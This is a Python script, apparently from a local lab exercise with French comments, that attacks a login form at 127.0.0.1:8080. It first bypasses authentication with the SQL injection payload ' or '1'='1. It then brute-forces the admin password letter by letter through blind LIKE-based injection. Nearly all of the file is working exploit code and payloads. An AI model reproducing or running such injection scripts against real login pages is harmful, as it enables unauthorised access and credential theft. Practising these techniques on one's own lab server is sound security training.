#!/usr/bin/env python3


import json
import urllib.request
import os
import requests


url = 'http://127.0.0.1:8080/login/'

# Partie contourner l'authentification
passTrame = "' or '1'='1"
#data = urllib.parse.urlencode({"login": "admin", "password": "hello"})
data = urllib.parse.urlencode({"login": "admin", "password": passTrame})
data = data.encode('ascii')

response = urllib.request.urlopen(url, data)


resultatHTML = str(response.read())
# #print("CODE HTML:\n\t\t"+resultatHTML+"\n\n")
# #print("INFO:\n\t\t"+str(response.info()))

stringToGET = 'Bravo vous etes authentifi'

if stringToGET in resultatHTML:
    print("by-pass authentification CONNECTE")
else:
    print("by-pass authentification NON-CONNECTE")
    print(str(response.read()))




# Partie récuperer le mot de passe de l'utilisateur admin


alphabet = 'a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z'.split(',')
password = ""



lettre = 'a'
passField = "' or password like'"+password+lettre+"%';--"

# data = urllib.parse.urlencode({"login": "admin", "password": passField})
# data = data.encode('ascii')

# response = urllib.request.urlopen(url, data)
# resultat = str(response.read())
# print(resultat)



# autre facon pour envoyer une rquete post au serveur
# data = {"login": "admin", "password": "' or password like'a%"}
# r = requests.post(url = url, data = data)
# pastebin_url = r.text
# print("The pastebin URL is:%s"%pastebin_url)




# bruteforce
for i in range(0, 6):
    # print("lettre "+str(i))
    for lettre in alphabet:

        # query à suivre
        # query = "select * from users where login='admin' and password='' like'"+lettre+"%'"

        passField = "' or password like'"+password+lettre+"%"

        data = urllib.parse.urlencode({"login": "admin", "password": passField})
        data = data.encode('ascii')

        response = urllib.request.urlopen(url, data)
        resultat = str(response.read())
        #print(resultat)
        if stringToGET in resultat:
            password += lettre

        

print("ICI le mot de passe de l'user 'admin' -> "+str(password))

